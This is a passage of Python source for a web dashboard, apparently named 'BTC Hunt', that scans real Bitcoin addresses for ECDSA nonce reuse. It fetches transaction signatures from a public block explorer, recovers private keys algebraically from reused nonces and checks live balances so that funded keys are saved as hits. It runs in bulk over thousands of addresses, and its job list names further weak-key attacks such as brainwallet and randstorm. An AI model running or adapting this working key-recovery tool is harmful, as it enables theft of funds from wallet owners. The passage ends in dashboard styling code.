        out += put_varint(n_out)
        for val, script in outs:
            out += val + put_varint(len(script)) + script
        out += locktime + htype.to_bytes(4, 'little')
        return int.from_bytes(sha256d(bytes(out)), 'big')
    except Exception:
        return None

def _fetch_sigs_for_address(addr, log, should_stop=None):
    """Fetch all (r,s,z) signatures for an address via Esplora."""
    sigs = []
    try:
        txt = _esplora_get(f"/address/{addr}/txs", should_stop)
        txs = json.loads(txt)
    except (_EsploraRateLimited, RuntimeError) as e:
        if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
            raise                    # do NOT report this as "0 signatures"
        log(f"[nonce] address fetch failed: {e}")
        return sigs
    except Exception as e:
        log(f"[nonce] address fetch failed: {e}")
        return sigs
    log(f"[nonce] {len(txs)} transactions for {addr}")
    for tx in txs:
        if should_stop and should_stop():
            log("[nonce] stopped")
            break
        txid = tx.get('txid')
        if not txid:
            continue
        # A tx with no legacy scriptSig (native segwit / taproot) cannot yield
        # a legacy DER signature, so don't spend a /tx/{txid}/hex call on it.
        # The address/txs response already contains vin[].scriptsig.
        vin = tx.get('vin', [])
        if not any(inp.get('scriptsig') for inp in vin):
            continue
        try:
            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex", should_stop))
        except (_EsploraRateLimited, RuntimeError) as e:
            if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
                raise
            continue
        except Exception:
            continue
        for idx, inp in enumerate(vin):
            if should_stop and should_stop():
                break
            script_sig_hex = inp.get('scriptsig', '')
            if not script_sig_hex: continue
            sig_bytes = bytes.fromhex(script_sig_hex)
            # find DER sig inside
            r_pos = sig_bytes.find(b'\x30')
            if r_pos < 0: continue
            parsed = _parse_der_sig(sig_bytes[r_pos:])
            if not parsed: continue
            r, s, htype = parsed
            prevout = inp.get('prevout', {})
            spk = prevout.get('scriptpubkey', '')
            if not spk: continue
            z = _legacy_sighash(raw, idx, bytes.fromhex(spk), htype)
            if z is None: continue
            sigs.append({"txid": txid, "r": r, "s": s, "z": z,
                         "input": idx, "type": "legacy"})
    return sigs

def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
    """Fetch sigs, group by r, recover key algebraically.

    `should_stop` lets a bulk scan abort mid-request; `prefix` tags log lines
    with the position in that scan. A single-address call behaves as before.
    """
    stop = should_stop or (lambda: job.get("stop", False))
    log(f"{prefix}[nonce] target {address}")
    sigs = _fetch_sigs_for_address(address, log, stop)
    if not sigs:
        log(f"{prefix}[nonce] no signatures extracted")
        return []
    by_r = defaultdict(list)
    for sg in sigs:
        by_r[sg['r']].append(sg)
    dupes = {r: v for r, v in by_r.items() if len(v) > 1}
    log(f"{prefix}[nonce] {len(dupes)} reused-r groups")
    hits = []
    for r, group in dupes.items():
        if stop(): break
        for a in range(len(group)):
            for b in range(a + 1, len(group)):
                s1, z1 = group[a]['s'], group[a]['z']
                s2, z2 = group[b]['s'], group[b]['z']
                den = (s1 - s2) % N
                if den == 0: continue
                try:
                    k = ((z1 - z2) * pow(den, -1, N)) % N
                    d = ((s1 * k - z1) * pow(r, -1, N)) % N
                except Exception:
                    continue
                derived = derive_addresses(d)
                # A recovered key that does not reproduce the target is almost
                # always a bad sighash parse, not a recovery. Log it, but do
                # not call it a hit and do not flood /results.
                if not any(addr == address for _, addr in derived):
                    log(f"{prefix}[nonce] recovered key does not match target "
                        f"(possible bad sighash) — not saved")
                    continue
                for label, addr in derived:
                    hit = {"address": address, "privkey": hex(d),
                           "recovered_addr": addr, "type": label,
                           "matches_target": addr == address,
                           "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    save, hit, note = _balance_gate(
                        hit, log, job, stop, prefix)
                    if not save:
                        if note == "stopped":
                            log(f"{prefix}[nonce] stopped by user")
                            return hits
                        continue
                    hits.append(hit); _save_result("nonce", hit)
                    log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}  {note}")
    log(f"{prefix}[nonce] done — {len(hits)} hits, "
        f"{job.get('auto_verify_skipped', 0):,} zero-balance candidate(s) skipped")
    return hits


def attack_nonce_reuse_bulk(addresses, log, job):
    """Scan a list of addresses for ECDSA nonce reuse, with progress + Stop.

    A rate-limited address is NOT counted as scanned. It is queued for one
    retry pass after the cooldown and, if still blocked, written to
    nonce_retry.txt on the data disk so it can be re-uploaded — instead of a
    misleading "100% done, 0 hits" after the first 429.
    """
    total = len(addresses)
    log(f"[nonce] bulk scan: {total:,} address(es)")
    if not total:
        job["detail"] = "no addresses"
        return []
    t0 = time.time()
    all_hits, failed = [], []
    checked = 0
    for i, addr in enumerate(addresses):
        if job["stop"]:
            log("[nonce] stopped by user")
            break
        prefix = f"[{i+1:,}/{total:,}] "
        try:
            all_hits.extend(attack_nonce_reuse(
                addr, log, job, should_stop=lambda: job["stop"], prefix=prefix))
            checked += 1
        except _EsploraRateLimited as e:
            failed.append(addr)
            log(f"{prefix}[!] rate limited — queued for retry ({e})")
        except RuntimeError as e:
            if "stopped by user" in str(e):
                log("[nonce] stopped by user")
                break
            log(f"{prefix}[!] {e}")
            checked += 1
        except Exception as e:
            # One bad address must not abort a multi-thousand-address scan.
            log(f"{prefix}[!] {e}")
            checked += 1
        done = i + 1
        elapsed = max(time.time() - t0, 0.001)
        rate = done / elapsed
        eta = (total - done) / max(rate, 0.001)
        job["progress"] = done / total
        job["detail"] = (f"{done:,}/{total:,} addresses  "
                         f"hits={len(all_hits):,}  unchecked={len(failed):,}  "
                         f"skipped={job.get('auto_verify_skipped', 0):,}  "
                         f"{rate:.2f} addr/s  eta ~{eta/60:.1f} min")

    if failed and not job["stop"]:
        log(f"[nonce] retrying {len(failed):,} rate-limited address(es) "
            "after the cooldown")
        still = []
        for j, addr in enumerate(failed):
            if job["stop"]:
                still.extend(failed[j:])
                break
            prefix = f"[retry {j+1:,}/{len(failed):,}] "
            try:
                attack_nonce_reuse(addr, log, job,
                                   should_stop=lambda: job["stop"], prefix=prefix)
                checked += 1
            except _EsploraRateLimited:
                still.append(addr)
            except Exception as e:
                log(f"{prefix}[!] {e}")
                still.append(addr)
        failed = still

    if failed:
        retry_path = DATA_DIR / NONCE_RETRY_FILE
        try:
            retry_path.write_text("\n".join(failed) + "\n", encoding="utf-8")
            saved = retry_path.name
        except OSError:
            saved = "(could not write retry file)"
        job["partial"] = True
        job["progress"] = min(1.0, checked / total)
        job["detail"] = (f"{checked:,}/{total:,} checked — "
                         f"{len(failed):,} unchecked, saved to {saved} "
                         "for re-upload")
        log(f"[nonce] {len(failed):,} address(es) still unchecked — "
            f"saved to {saved}")
    log(f"[nonce] bulk done — {len(all_hits):,} hits over "
        f"{checked:,}/{total:,} address(es) checked "
        f"({job.get('auto_verify_skipped', 0):,} zero-balance candidates skipped)")
    return all_hits


# ════════════════════════════════════════════════════════════════════
# JOB MANAGER + SQLITE
# ════════════════════════════════════════════════════════════════════
_JOBS = {}
_JOBS_LOCK = threading.Lock()
JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify",
             "eth_ts", "eth_weak", "eth_verify", "eth_retry", "eth_era")

_HITS_FILE = None  # set in worker mode: append-only JSONL of hits

def _db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.executescript("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            attack TEXT, payload TEXT, ts TEXT
        );
        CREATE TABLE IF NOT EXISTS balance_checks (
            address TEXT PRIMARY KEY,
            sats INTEGER NOT NULL DEFAULT 0,
            tx_count INTEGER NOT NULL DEFAULT 0,
            mempool_sats INTEGER NOT NULL DEFAULT 0,
            checked_at TEXT NOT NULL,
            error TEXT NOT NULL DEFAULT ''
        );
    """)
    return c

def _save_result(attack, payload):
    with _db() as c:
        c.execute("INSERT INTO results (attack,payload,ts) VALUES (?,?,?)",
                  (attack, json.dumps(payload), datetime.now(timezone.utc).isoformat()))
    if _HITS_FILE is not None:
        _HITS_FILE.write(json.dumps({"attack": attack, **payload}) + "\n")
        _HITS_FILE.flush()

def _list_results():
    with _db() as c:
        return [{"attack": a, "payload": json.loads(p), "ts": t}
                for a, p, t in c.execute(
                    "SELECT attack,payload,ts FROM results ORDER BY id DESC LIMIT 500")]

# ── Optional post-hit balance verification ─────────────────────────────
# Deliberately NOT inside _save_result: a network call per Bloom hit in the
# hot loop would hammer the explorer and stall the attack. Hits stay saved as
# candidates; /results checks them in a separate, paced, stoppable job.

def _all_result_addresses(limit=None):
    """Unique, syntactically valid addresses from every saved hit."""
    with _db() as c:
        rows = list(c.execute("SELECT payload FROM results ORDER BY id DESC"))
    out, seen = [], set()
    for (p,) in rows:
        try:
            item = json.loads(p)
        except Exception:
            continue
        if not isinstance(item, dict):
            continue
        for key in ("address", "recovered_addr"):
            a = item.get(key)
            if not isinstance(a, str):
                continue
            a = _normalise_address(a)
            if not _valid_address(a) or a in seen:
                continue
            seen.add(a)
            out.append(a)
            if limit and len(out) >= limit:
                return out
    return out

def _store_balance_check(addr, sats, tx_count, mempool_sats, error=""):
    with _db() as c:
        c.execute("INSERT OR REPLACE INTO balance_checks "
                  "(address,sats,tx_count,mempool_sats,checked_at,error) "
                  "VALUES (?,?,?,?,?,?)",
                  (addr, int(sats), int(tx_count), int(mempool_sats),
                   datetime.now(timezone.utc).isoformat(timespec="seconds"),
                   str(error)[:200]))

def _balance_checks():
    with _db() as c:
        return {a: {"sats": s, "tx_count": t, "mempool_sats": ms,
                    "checked_at": ts, "error": e}
                for a, s, t, ms, ts, e in c.execute(
                    "SELECT address,sats,tx_count,mempool_sats,checked_at,error "
                    "FROM balance_checks")}

def _balance_badge(addr, checks):
    v = checks.get(addr)
    if not v:
        return '<span class="muted">not checked yet</span>'
    if v["error"]:
        return ('<span class="badge warn">check failed: '
                + html.escape(str(v["error"])[:120]) + '</span>')
    if str(addr).startswith("0x"):
        # ETH rows reuse the same table with a documented convention:
        # sats = whole gwei, mempool_sats = remaining wei, tx_count = nonce.
        wei = v["sats"] * 10 ** 9 + v["mempool_sats"]
        if wei > 0:
            # The nonce matters here: it says the account has actually sent a
            # transaction, so a balance is not just an untouched deposit.
            return (f'<span class="badge ok">{wei / 1e18:.6f} ETH · nonce '
                    f'{v["tx_count"]:,} — verify manually with a block '
                    'explorer</span>')
        if v["tx_count"] == 0:
            return ('<span class="badge bad">0 ETH · nonce 0 — no outgoing '
                    'tx ever, likely never used</span>')
        return (f'<span class="badge bad">0 ETH · nonce {v["tx_count"]:,} — '
                'used and emptied</span>')
    total = v["sats"] + v["mempool_sats"]
    if total > 0:
        return (f'<span class="badge ok">{total/1e8:.8f} BTC — '
                'verify manually with a block explorer</span>')
    if v["tx_count"] == 0:
        return ('<span class="badge bad">0 BTC · never funded — '
                'likely Bloom false positive</span>')
    return '<span class="badge bad">0 BTC · spent / empty</span>'

def _live_balance(addr, should_stop=None):
    """One live Esplora balance lookup for a Bloom candidate."""
    txt = _esplora_get(f"/address/{addr}", should_stop)
    d = json.loads(txt)
    chain = d.get("chain_stats") or {}
    mem = d.get("mempool_stats") or {}
    sats = int(chain.get("funded_txo_sum", 0)) - int(chain.get("spent_txo_sum", 0))
    msats = int(mem.get("funded_txo_sum", 0)) - int(mem.get("spent_txo_sum", 0))
    tx_count = int(chain.get("tx_count", 0))
    return {"sats": sats, "mempool_sats": msats, "tx_count": tx_count,
            "checked_at": datetime.now(timezone.utc).isoformat(timespec="seconds")}


def _balance_gate(hit, log, job, should_stop=None, prefix=""):
    """Live-check a Bloom candidate before it is saved or logged as a hit.

    Returns (save, enriched_hit, note). Zero-balance candidates are skipped by
    default; explorer failures are saved with balance_error, never dropped.
    """
    if not AUTO_VERIFY_HITS:
        return True, hit, "candidate (auto-verify off)"
    addr = hit.get("address") or hit.get("recovered_addr")
    if not isinstance(addr, str):
        return True, hit, "no address — saved as candidate"
    addr = _normalise_address(addr)
    if not _valid_address(addr):
        return True, hit, "invalid address — saved as candidate"
    stop = should_stop or (lambda: job.get("stop", False))
    throttled = False
    try:
        b = _live_balance(addr, stop)
    except _EsploraRateLimited as e:
        # The endpoint is rate-limiting us. That says nothing about the
        # address, so keep it queued for /results instead of storing a
        # "check failed" verdict against it.
        err = str(e)
        throttled = True
    except RuntimeError as e:
        if "stopped by user" in str(e):
            log(f"{prefix}[auto-verify] stopped by user")
            return False, hit, "stopped"
        err = str(e)
    except Exception as e:
        err = str(e)
    else:
        _store_balance_check(addr, b["sats"], b["tx_count"], b["mempool_sats"])
        total = b["sats"] + b["mempool_sats"]
        verdict = ("funded_verify_manually" if total > 0 else
                   "never_funded_likely_false_positive" if b["tx_count"] == 0 else
                   "empty_or_spent")
        enriched = {**hit,
                    "balance_sats": total,
                    "balance_tx_count": b["tx_count"],
                    "balance_checked_at": b["checked_at"],
                    "balance_error": "",
                    "balance_verdict": verdict}
        if total >= AUTO_VERIFY_MIN_SATS:
            return True, enriched, (
                f"balance={total / 1e8:.8f} BTC · tx_count={b['tx_count']:,} · "
                "verify manually")
        job["auto_verify_skipped"] = job.get("auto_verify_skipped", 0) + 1
        why = "never funded" if b["tx_count"] == 0 else "spent / empty"
        log(f"{prefix}[-] skipped {addr}: 0 BTC · {why} "
            "(Bloom false positive)")
        return False, enriched, ""
    if throttled:
        job["throttled"] = job.get("throttled", 0) + 1
        enriched = {**hit, "balance_sats": None, "balance_tx_count": 0,
                    "balance_checked_at":
                        datetime.now(timezone.utc).isoformat(timespec="seconds"),
                    "balance_error": str(err)[:200],
                    "balance_verdict": "check_failed_throttled",
                    "balance_retry": True}
        log(f"{prefix}[!] {addr}: endpoint throttled ({err}) — saved "
            "unverified, re-check it from /results")
        return True, enriched, "endpoint throttled — re-check later"
    _store_balance_check(addr, 0, 0, 0, err)
    enriched = {**hit, "balance_sats": None, "balance_tx_count": 0,
                "balance_checked_at":
                    datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "balance_error": str(err)[:200],
                "balance_verdict": "check_failed"}
    log(f"{prefix}[!] balance check failed for {addr}: {err} — saved as candidate")
    return True, enriched, "balance check failed — verify manually"


def verify_result_balances(force, log, job):
    """Check saved hits against Esplora. Paced, cached, stoppable, retried.

    A 429 is not a verdict about an address. Throttled addresses go back on
    the queue for another pass (up to VERIFY_RETRY_PASSES) and, if every pass
    is throttled, they stay "not checked yet" instead of being stored as
    errors — so one rate limit can no longer turn a 149-address run into 149
    "check failed" badges.
    """
    if force:
        log("[verify] forced re-check (Esplora cache cleared)")
    addrs = _all_result_addresses(VERIFY_MAX_ADDRESSES)
    if not addrs:
        log("[verify] no saved hits with a valid address")
        job["detail"] = "no addresses to check"
        return
    total = len(addrs)
    endpoints = ", ".join(_esplora_host(b) for b in _ESPLORA_BASES)
    log(f"[verify] checking {total:,} unique address(es) against {endpoints}")
    t0 = time.time()
    funded = never_funded = errors = checked = 0
    stopped = False
    pending = list(addrs)
    passes = 0

    def report():
        rate = checked / max(time.time() - t0, 0.001)
        job["progress"] = min(1.0, checked / total)
        job["throttled"] = len(pending)
        job["detail"] = (f"{checked:,}/{total:,} addresses  funded={funded:,}  "
                         f"never-funded={never_funded:,}  errors={errors:,}  "
                         f"throttled={len(pending):,}  {rate:.2f} addr/s")

    while pending and passes <= VERIFY_RETRY_PASSES and not stopped:
        passes += 1
        batch, pending = pending, []
        if passes > 1:
            wait = min(ESPLORA_MAX_BACKOFF_SECS, 5.0 * (2 ** (passes - 2)))
            log(f"[verify] pass {passes}/{VERIFY_RETRY_PASSES + 1}: retrying "
                f"{len(batch):,} throttled address(es) in {wait:.0f}s — "
                f"{_esplora_status()}")
            try:
                _esplora_sleep(wait, lambda: job["stop"])
            except RuntimeError:
                log("[verify] stopped by user")
                break
        for addr in batch:
            if job["stop"]:
                log("[verify] stopped by user")
                stopped = True
                break
            try:
                txt = _esplora_get(f"/address/{addr}", lambda: job["stop"])
                d = json.loads(txt)
                chain = d.get("chain_stats") or {}
                mem = d.get("mempool_stats") or {}
                sats = int(chain.get("funded_txo_sum", 0)) - int(chain.get("spent_txo_sum", 0))
                msats = int(mem.get("funded_txo_sum", 0)) - int(mem.get("spent_txo_sum", 0))
                tx_count = int(chain.get("tx_count", 0))
                _store_balance_check(addr, sats, tx_count, msats)
                checked += 1
                if sats + msats > 0:
                    funded += 1
                    log(f"[verify] {addr}: {sats+msats:,} sats — VERIFY MANUALLY")
                elif tx_count == 0:
                    never_funded += 1
                else:
                    log(f"[verify] {addr}: 0 sats (spent/empty)")
            except _EsploraRateLimited as e:
                # Still throttled: re-queue, and store nothing so the badge
                # stays "not checked yet" rather than "check failed".
                pending.append(addr)
                if len(pending) == 1 or len(pending) % 25 == 0:
                    log(f"[verify] {addr}: {e}")
            except RuntimeError as e:
                if "stopped by user" in str(e):
                    log("[verify] stopped by user")
                    stopped = True
                    break
                errors += 1
                checked += 1
                _store_balance_check(addr, 0, 0, 0, str(e))
                log(f"[verify] {addr}: {e}")
            except Exception as e:
                # One bad response must not abort a multi-thousand-address run.
                errors += 1
                checked += 1
                _store_balance_check(addr, 0, 0, 0, str(e))
                log(f"[verify] {addr}: {e}")
            report()
    job["throttled"] = len(pending)
    report()
    tail = (f", {len(pending):,} still throttled after {passes} pass(es) — "
            f"run Check balances again ({_esplora_status()})" if pending else "")
    log(f"[verify] done — {funded:,} with balance, {never_funded:,} never funded, "
        f"{errors:,} errors{tail}")


def _sync_busy():
    """Keep the deploy marker and its PID file in sync with the live jobs."""
    try:
        with _JOBS_LOCK:
            alive = sorted(n for n, j in _JOBS.items() if j["alive"])
        if alive:
            BUSY_FILE.write_text(",".join(alive), encoding="utf-8")
            BUSY_PID_FILE.write_text(str(os.getpid()), encoding="utf-8")
        else:
            BUSY_FILE.unlink(missing_ok=True)
            BUSY_PID_FILE.unlink(missing_ok=True)
    except OSError:
        pass


def _start_job(name, fn, *args):
    with _JOBS_LOCK:
        prev = _JOBS.get(name)
        if prev and prev["alive"]:
            return False, "job already running"
        if prev and prev.get("resetting"):
            return False, "job is still shutting down after reset"
        job = {"progress": 0.0, "detail": "starting…", "alive": True,
               "stop": False, "log": [], "log_total": 0, "error": "",
               "killed": False, "resetting": False,
               "auto_verify_skipped": 0, "throttled": 0,
               "started": datetime.now(timezone.utc).isoformat()}
        _JOBS[name] = job
    _sync_busy()

    def log(msg):
        # The log list is capped, but log_total is monotonic so clients can
        # ask for "everything since N" without losing their place. A killed
        # job must not append "done" after the reset cleared its state.
        with _JOBS_LOCK:
            if job.get("killed") and not msg.startswith("[reset]"):
                return
            job["log"].append(msg)
            job["log_total"] += 1
            if len(job["log"]) > 500:
                del job["log"][:-500]
        print(f"[{name}] {msg}", flush=True)

    def runner():
        try:
            fn(*args, job=job, log=log)
        except Exception as e:
            if not job.get("killed"):
                job["error"] = str(e)
                log(f"[!] {name} crashed: {e}")
        finally:
            with _JOBS_LOCK:
                job["alive"] = False
                was_killed = bool(job.get("killed"))
                # A reset removes the slot entirely once the thread unwinds.
                if was_killed and _JOBS.get(name) is job:
                    del _JOBS[name]
                job["resetting"] = False
                if not was_killed:
                    if job["error"]:
                        job["detail"] = f"failed: {job['error']}"
                    elif job.get("stop") and job.get("progress", 0.0) < 1.0:
                        # Stopped before the end. Now that no range is refused
                        # and huge runs are normal, a stopped run is the common
                        # case — the bar must show where it actually got to, not
                        # jump to a green 100% it never earned.
                        job["partial"] = True
                        job["detail"] = ("stopped at %.2f%% — everything found "
                                         "so far is kept"
                                         % (100.0 * job.get("progress", 0.0)))
                    else:
                        if not job.get("partial"):
                            job["progress"] = 1.0
                        job["detail"] = job["detail"] or "done"
            _sync_busy()

    threading.Thread(target=runner, daemon=True).start()
    return True, "started"


def _kill_all_jobs(reason="killed from dashboard"):
    """Stop every job slot, clear its UI state and unblock auto-deploy.

    Python cannot forcibly kill a thread, so alive threads are flagged and
    removed from _JOBS once they unwind. The dashboard also offers a Gunicorn
    worker restart, which kills any thread that ignores its stop flag.
    """
    killed = []
    with _JOBS_LOCK:
        for name, job in list(_JOBS.items()):
            if not job["alive"] and not job.get("resetting"):
                del _JOBS[name]          # forget completed jobs too
                continue
            job["stop"] = True
            job["alive"] = False
            job["killed"] = True
            job["resetting"] = True
            job["error"] = ""
            job["progress"] = 0.0
            job["detail"] = "killed — no jobs running"
            job["partial"] = False
            job["log"] = []
            job["log_total"] = 0
            killed.append(name)
    try:
        BUSY_FILE.unlink(missing_ok=True)
        BUSY_PID_FILE.unlink(missing_ok=True)
    except OSError:
        pass
    return killed


def _can_restart_worker():
    """Only a Gunicorn worker can safely be replaced by its master."""
    if os.environ.get("BTC_HUNT_WORKER_RESTART", "1") == "0":
        return False
    try:
        cmd = (Path(f"/proc/{os.getppid()}/cmdline")
               .read_bytes().replace(b"\0", b" ")
               .decode("utf-8", "ignore"))
    except OSError:
        return False
    return "gunicorn" in cmd and "btc_hunt:app" in cmd


def _schedule_worker_restart():
    """Let the HTTP response finish, then ask Gunicorn for a fresh worker."""
    def die():
        time.sleep(0.5)
        try:
            os.kill(os.getpid(), signal.SIGTERM)
        except Exception:
            os._exit(1)
        time.sleep(1.0)
        try:
            os.kill(os.getpid(), signal.SIGKILL)
        except Exception:
            os._exit(1)
    threading.Thread(target=die, daemon=True).start()


# ════════════════════════════════════════════════════════════════════
# FLASK APP
# ════════════════════════════════════════════════════════════════════
app = Flask(__name__)

# Optional HTTP Basic auth. This dashboard exposes unauthenticated POST
# endpoints and a public URL on Render; set both env vars (the Blueprint
# prompts for them) to require a login. Leave them blank for the original
# open behaviour. /health stays public so Render's health check works.
APP_USER     = os.environ.get("APP_USER", "").strip()
APP_PASSWORD = os.environ.get("APP_PASSWORD", "")

def _auth_challenge():
    return Response("Authentication required", 401,
                    {"WWW-Authenticate": 'Basic realm="BTC Hunt"'})

@app.before_request
def _require_auth():
    if not (APP_USER and APP_PASSWORD) or request.path == "/health":
        return None
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Basic "):
        return _auth_challenge()
    try:
        user, pw = base64.b64decode(auth[6:], validate=True).decode("utf-8").split(":", 1)
    except Exception:
        return _auth_challenge()
    if not (hmac.compare_digest(user, APP_USER) and
            hmac.compare_digest(pw, APP_PASSWORD)):
        return _auth_challenge()
    return None

@app.route("/health")
def health():
    # Liveness only: no disk, dataset or database dependency. `build` is the
    # git commit this process started from — compare it with the latest commit
    # on main to check whether an auto-pull deploy actually took effect.
    return {"status": "ok", "build": BUILD_ID, "started": STARTED_AT,
            "ec": EC_BACKEND, "keccak": ETH_HASH_BACKEND}

PAGE = """
<!doctype html><html><head><meta charset="utf-8">
<title>BTC Hunt — weak-key attack dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
/* ── palette ─────────────────────────────────────────────────────────── */
:root{
  --bg:#080b10; --bg2:#0d1219; --panel:#151c25; --panel2:#111821;
  --line:#26313f; --line2:#334154; --ink:#dce4ee; --dim:#8b9bad;
  --cy:#63d3e8; --bl:#5b8fd6; --gr:#79d17f; --am:#f0c14b; --rd:#f0687a;
  --vio:#a98cf0;
  --r:14px;
  /* height the locked card headers stick below; refreshSticky() measures the
     real .topbar and overwrites this, because it wraps with the window width */
  --stick:112px;
}
*{box-sizing:border-box;margin:0}
html{scroll-behavior:smooth}
body{
  background:
    radial-gradient(1100px 520px at 12% -8%, rgba(99,211,232,.10), transparent 60%),
    radial-gradient(900px 480px at 92% 4%, rgba(169,140,240,.09), transparent 62%),
    radial-gradient(700px 700px at 50% 110%, rgba(121,209,127,.06), transparent 60%),
    linear-gradient(180deg,var(--bg2),var(--bg) 40%);
  background-attachment:fixed;
  color:var(--ink); padding:0 20px 40px; max-width:1180px; margin:0 auto;
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  font-size:14px; line-height:1.55; -webkit-font-smoothing:antialiased;
}
body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),
    linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);
  background-size:44px 44px;mask-image:radial-gradient(circle at 50% 0%,#000,transparent 78%)}
a{color:var(--cy);text-decoration:none}
a:hover{color:#a8ecf8;text-shadow:0 0 12px rgba(99,211,232,.45)}
hr{border:0;border-top:1px solid var(--line);margin:16px 0}
code{background:#0a0f15;border:1px solid var(--line);border-radius:5px;
  padding:1px 5px;color:var(--am);font-size:.92em}
::selection{background:rgba(99,211,232,.28)}

/* ── sticky, locked header ───────────────────────────────────────────── */
.topbar{position:sticky;top:0;z-index:60;margin:0 -20px 18px;padding:12px 20px 10px;
  background:linear-gradient(180deg,rgba(10,14,20,.96),rgba(10,14,20,.80));
  backdrop-filter:blur(14px) saturate(140%);-webkit-backdrop-filter:blur(14px);
  border-bottom:1px solid var(--line2);
  box-shadow:0 12px 30px rgba(0,0,0,.55),0 1px 0 rgba(255,255,255,.05) inset}
.toprow{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
h1{font-size:19px;letter-spacing:.4px;color:#eaf3fb;
  text-shadow:0 0 18px rgba(99,211,232,.35),0 2px 0 rgba(0,0,0,.6)}
h1 .sub{display:block;font-size:11px;font-weight:400;color:var(--dim);
  letter-spacing:.8px;text-transform:uppercase;text-shadow:none;margin-top:2px}
.chips{display:flex;gap:6px;flex-wrap:wrap;margin-left:auto;align-items:center}
.chip{font-size:11px;color:var(--dim);background:#0c121a;border:1px solid var(--line);
  border-radius:999px;padding:3px 9px;white-space:nowrap;
  box-shadow:0 1px 2px rgba(0,0,0,.5) inset}
.chip b{color:var(--cy);font-weight:600}
.chip.warn b{color:var(--am)}
.nav{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px;align-items:center}
.nav a{position:relative;padding:6px 13px;border-radius:999px;font-size:12.5px;
  color:#c3d0de;background:linear-gradient(180deg,#1b2431,#141c26);
  border:1px solid var(--line);text-decoration:none;margin:0;
  box-shadow:0 2px 5px rgba(0,0,0,.45),0 1px 0 rgba(255,255,255,.06) inset;
  transition:transform .09s,box-shadow .15s,color .15s,border-color .15s}
.nav a:hover{transform:translateY(-1px);color:#fff;border-color:var(--line2);
  box-shadow:0 5px 14px rgba(0,0,0,.55),0 0 0 1px rgba(99,211,232,.22)}
.nav a:active{transform:translateY(1px)}
.nav a.on{color:#04121a;font-weight:700;border-color:#8ee6f6;
  background:linear-gradient(180deg,#8ee6f6,#3fb9d4);
  box-shadow:0 3px 10px rgba(63,185,212,.4),0 1px 0 rgba(255,255,255,.5) inset;
  text-shadow:none}
.nav .spacer{margin-left:auto}

/* ── cards / widgets ─────────────────────────────────────────────────── */
.card{position:relative;z-index:1;scroll-margin-top:calc(var(--stick) + 14px);
  background:linear-gradient(180deg,var(--panel),var(--panel2));
  border:1px solid var(--line);border-radius:var(--r);padding:18px 18px 16px;
  margin:16px 0;box-shadow:0 14px 34px rgba(0,0,0,.42),
  0 1px 0 rgba(255,255,255,.045) inset;transition:border-color .2s,box-shadow .2s}
.card:hover{border-color:var(--line2);box-shadow:0 18px 44px rgba(0,0,0,.5),
  0 1px 0 rgba(255,255,255,.06) inset}
.card::before{content:"";position:absolute;left:14px;right:14px;top:0;height:2px;
  border-radius:0 0 4px 4px;background:linear-gradient(90deg,var(--cy),var(--vio),var(--gr));
  opacity:.55}
.card.accent-red::before{background:linear-gradient(90deg,var(--rd),var(--am))}
.card.accent-green::before{background:linear-gradient(90deg,var(--gr),var(--cy))}
h2{position:sticky;top:var(--stick);z-index:5;margin:-4px -6px 12px;padding:8px 6px 7px;
  font-size:14.5px;letter-spacing:.5px;color:#e6f2fb;text-transform:uppercase;
  background:linear-gradient(180deg,rgba(21,28,37,.98),rgba(21,28,37,.86));
  backdrop-filter:blur(6px);border-bottom:1px solid var(--line);
  border-radius:8px 8px 0 0;text-shadow:0 1px 0 rgba(0,0,0,.6)}
h2 .tag{float:right;font-size:10.5px;letter-spacing:.6px;color:var(--dim);
  text-transform:none;border:1px solid var(--line);border-radius:999px;padding:2px 8px;
  background:#0c121a}
h3{font-size:13px;color:var(--cy);margin:14px 0 6px;letter-spacing:.3px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:14px}
.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.muted{color:var(--dim);font-size:12.8px}
.tiny{color:var(--dim);font-size:11.5px}
.hit{color:var(--am);font-weight:bold;text-shadow:0 0 14px rgba(240,193,75,.4)}
.status-ok{color:var(--gr)}.status-bad{color:var(--rd)}

/* ── 3D buttons ──────────────────────────────────────────────────────── */
.btn{position:relative;display:inline-flex;align-items:center;gap:7px;
  font-family:inherit;font-size:13px;font-weight:700;letter-spacing:.3px;
  color:#eef4fb;padding:9px 16px;margin:4px 6px 4px 0;border-radius:11px;
  border:1px solid #7fa6d8;cursor:pointer;text-shadow:0 1px 1px rgba(0,0,0,.5);
  background:linear-gradient(180deg,#6f9ad0 0%,#4d78ad 48%,#3d6391 100%);
  box-shadow:0 1px 0 rgba(255,255,255,.35) inset,0 -2px 0 rgba(0,0,0,.32) inset,
    0 5px 12px rgba(0,0,0,.5),0 2px 3px rgba(0,0,0,.4);
  transition:transform .08s ease,box-shadow .15s ease,filter .15s ease}
.btn:hover{filter:brightness(1.13) saturate(1.08);transform:translateY(-1px);
  box-shadow:0 1px 0 rgba(255,255,255,.4) inset,0 -2px 0 rgba(0,0,0,.32) inset,
    0 9px 20px rgba(0,0,0,.55),0 0 0 1px rgba(142,230,246,.35)}
.btn:active{transform:translateY(2px);filter:brightness(.96);
  box-shadow:0 1px 0 rgba(255,255,255,.18) inset,0 2px 6px rgba(0,0,0,.6)}
.btn:focus-visible{outline:2px solid var(--cy);outline-offset:2px}
.btn.danger{border-color:#e08a95;
  background:linear-gradient(180deg,#d9707f 0%,#b94f5f 48%,#98384a 100%)}
